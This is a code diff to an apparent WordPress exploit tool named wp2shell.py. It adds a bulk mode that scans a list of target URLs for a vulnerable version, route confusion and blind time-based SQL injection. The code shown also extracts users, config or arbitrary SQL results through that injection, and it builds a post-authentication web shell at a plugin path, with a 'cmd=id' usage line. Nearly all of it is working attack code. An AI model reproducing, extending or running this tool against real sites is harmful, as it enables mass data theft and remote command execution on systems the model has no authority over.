@@ -552,6 +552,21 @@ def cmd_check(target: str, args) -> dict:
         results["route_confusion"] = {"detected": False, "error": str(e)}
 
     section("SQL injection confirmation")
+    if args.quick or args.sleep <= 0:
+        info("Skipping SQLi confirmation (--quick / --sleep 0)")
+        results["sqli"] = {"confirmed": False, "reason": "Skipped by user"}
+        results["vulnerable"] = (
+            results.get("version", {}).get("affected", False)
+            and results.get("route_confusion", {}).get("detected", False)
+        )
+        section("VERDICT")
+        if results["vulnerable"]:
+            fail("LIKELY VULNERABLE — version affected + route confusion confirmed (SQLi skipped)")
+            warn("Run without --quick to confirm full chain with --sleep 3")
+        else:
+            ok("Not vulnerable based on version + confusion check")
+        return results
+
     sqli = BlindSQLi(bc, sleep=args.sleep)
     try:
         timing = sqli.confirm_timing(samples=args.rounds)
@@ -618,16 +633,20 @@ def cmd_read(target: str, args) -> Optional[dict]:
     sqli = BlindSQLi(bc, sleep=args.sleep)
     result = {"target": target, "preset": args.preset or "query", "items": []}
 
-    section("Confirming SQL injection channel")
-    try:
-        ok_flag, base, delay = sqli.confirm()
-    except TargetError as e:
-        fail(f"Cannot reach target: {e}")
-        sys.exit(1)
-    if not ok_flag:
-        fail("SQL injection not confirmed — target may not be vulnerable or reachable")
-        sys.exit(1)
-    ok(f"Channel open (baseline={base:.2f}s, delayed={delay:.2f}s)")
+    if args.no_confirm:
+        section("Skipping SQLi confirmation (--no-confirm)")
+    else:
+        section("Confirming SQL injection channel")
+        try:
+            ok_flag, base, delay = sqli.confirm()
+        except TargetError as e:
+            fail(f"Cannot reach target: {e}")
+            sys.exit(1)
+        if not ok_flag:
+            fail(f"SQL injection not confirmed — target may not be vulnerable or reachable")
+            fail(f"Try without --no-confirm, or increase --sleep")
+            sys.exit(1)
+        ok(f"Channel open (baseline={base:.2f}s, delayed={delay:.2f}s)")
 
     if args.query:
         section(f"Extracting: {args.query}")
@@ -924,7 +943,7 @@ if (isset($_GET["token"]) && $_GET["token"] === "{slug}") {{
         )
         r = opener.open(req, timeout=args.timeout)
         output = r.read().decode("utf-8", "replace")
-        print(f"\n  {GRN}{output.strip()}{RST}")
+        print(f"\n  {G}{output.strip()}{RST}")
     except Exception as e:
         fail(f"Command failed: {e}")
 
@@ -970,8 +989,8 @@ if (isset($_SESSION["auth"]) && $_SESSION["auth"] === true) {{
         return
 
     shell_url = f"{target}/wp-content/plugins/{slug}/shell.php?token={token}"
-    print(f"\n  {GRN}[+]{RST} Shell URL: {GRN}{shell_url}{RST}")
-    print(f"  {GRN}[+]{RST} Usage    : {shell_url}&cmd=id")
+    print(f"\n  {G}[+]{RST} Shell URL: {G}{shell_url}{RST}")
+    print(f"  {G}[+]{RST} Usage    : {shell_url}&cmd=id")
     print(f"  {Y}[!]{RST} Token ({token[:8]}...) is hidden in URL. Keep it secret.")
 
 
@@ -1071,7 +1090,13 @@ def _export(result: Optional[dict], path: Optional[str], cmd: str) -> None:
             print(f"\n  {G}[+]{RST} Exported JSON -> {path}")
 
         elif ext == ".csv":
-            rows = _flatten_for_csv(result, cmd)
+            if isinstance(result, list):
+                # Bulk mode: each item is a scan result dict
+                rows = []
+                for r in result:
+                    rows.extend(_flatten_for_csv(r, cmd))
+            else:
+                rows = _flatten_for_csv(result, cmd)
             if rows:
                 with open(path, "w", encoding="utf-8", newline="") as f:
                     w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
@@ -1093,15 +1118,13 @@ def _export(result: Optional[dict], path: Optional[str], cmd: str) -> None:
 def _flatten_for_csv(result: dict, cmd: str) -> list[dict]:
     """Convert nested result dict into flat CSV rows."""
     rows = []
-    if cmd == "scan":
+    if cmd == "scan" or cmd == "bulk":
         rows.append({
             "target": result.get("target", ""),
             "version": result.get("version", {}).get("version", ""),
             "version_affected": result.get("version", {}).get("affected", ""),
             "route_confusion": result.get("route_confusion", {}).get("detected", ""),
             "sqli_confirmed": result.get("sqli", {}).get("confirmed", ""),
-            "sqli_baseline": result.get("sqli", {}).get("baseline", ""),
-            "sqli_delayed": result.get("sqli", {}).get("delayed", ""),
             "sqli_delta": result.get("sqli", {}).get("delta", ""),
             "vulnerable": result.get("vulnerable", ""),
         })
@@ -1125,9 +1148,11 @@ def main():
   wp2shell.py -t http://127.0.0.1:8081 read --preset users -o users.csv
   wp2shell.py -t http://127.0.0.1:8081 read --preset fingerprint -o fingerprint.json
   wp2shell.py -t http://127.0.0.1:8081 read --query "SELECT VERSION()" -o result.txt
-  wp2shell.py -t target.com scan -o scan-report.json
+  wp2shell.py -l targets.txt scan -o report.csv
+  wp2shell.py -l targets.txt scan --sleep 2 --rounds 2
 """)
     parser.add_argument("-t", "--target", help="WordPress base URL")
+    parser.add_argument("-l", "--list", help="File with list of URLs to scan (one per line)")
     parser.add_argument("--timeout", type=float, default=30.0, help="HTTP timeout (default: 30s)")
     parser.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
     parser.add_argument("--ua", default="wp2shell/1.0 (dinhvaren)", help="User-Agent")
@@ -1137,15 +1162,18 @@ def main():
     sub = parser.add_subparsers(dest="command", help="Sub-command")
 
     scn = sub.add_parser("scan", help="Scan target for wp2shell vulnerability")
-    scn.add_argument("--sleep", type=float, default=3.0, help="Sleep seconds for SQLi timing (default: 3)")
+    scn.add_argument("--sleep", type=float, default=3.0, help="Sleep seconds for SQLi timing (0 = skip SQLi)")
     scn.add_argument("--rounds", type=int, default=3, help="Timing rounds (default: 3)")
+    scn.add_argument("--quick", action="store_true", help="Skip SQLi confirmation (version + confusion only)")
 
     rd = sub.add_parser("read", help="Extract data via blind SQLi")
     rd.add_argument("--preset", choices=["users", "fingerprint", "config"],
                     help="Extraction preset")
     rd.add_argument("--query", help="Raw SQL expression to extract")
-    rd.add_argument("--sleep", type=float, default=3.0, help="Sleep seconds for SQLi timing")
+    rd.add_argument("--sleep", type=float, default=1.0, help="Sleep seconds for SQLi confirm (default: 1)")
     rd.add_argument("--max-length", type=int, default=128, help="Max chars to extract")
+    rd.add_argument("--no-confirm", action="store_true",
+                    help="Skip SLEEP confirmation (use if already scanned)")
 
     sh = sub.add_parser("shell", help="Post-auth shell via admin plugin upload (requires creds)")
     sh.add_argument("-u", "--user", default="admin", help="WordPress admin username")
@@ -1154,6 +1182,48 @@ def main():
 
     args = parser.parse_args()
 
+    # Bulk scan mode: read URLs from file
+    if args.list:
+        if not os.path.isfile(args.list):
+            print(f"  {R}[-]{RST} File not found: {args.list}")
+            sys.exit(1)
+        with open(args.list, "r", encoding="utf-8") as f:
+            urls = [line.strip() for line in f if line.strip()]
+        if not urls:
+            print(f"  {R}[-]{RST} No URLs found in {args.list}")
+            sys.exit(1)
+
+        show_banner()
+        print(f"  {DIM}Bulk scan: {len(urls)} targets from {args.list}{RST}")
+        print(f"  {DIM}Time     : {time.strftime('%Y-%m-%d %H:%M:%S')}{RST}\n")
+
+        all_results = []
+        for i, url in enumerate(urls, 1):
+            if not url.startswith("http"):
+                url = "http://" + url
+            url = url.rstrip("/")
+            print(f"  {C}[{i}/{len(urls)}]{RST} {url}")
+            try:
+                r = cmd_check(url, args)
+                r["_index"] = i
+                all_results.append(r)
+            except Exception as e:
+                all_results.append({"target": url, "vulnerable": False, "error": str(e), "_index": i})
+                print(f"  {R}[-]{RST} Error: {e}")
+            print()
+
+        # Summary
+        vuln_count = sum(1 for r in all_results if r.get("vulnerable"))
+        print(f"  {C}── Summary ──{RST}")
+        print(f"  Total      : {len(all_results)}")
+        print(f"  {R}Vulnerable : {vuln_count}{RST}")
+        print(f"  {G}Safe       : {len(all_results) - vuln_count}{RST}")
+
+        if args.output:
+            _export(all_results, args.output, "bulk")
+        return
+
+    # Single target mode
     if not args.target:
         parser.print_help()
         sys.exit(1)
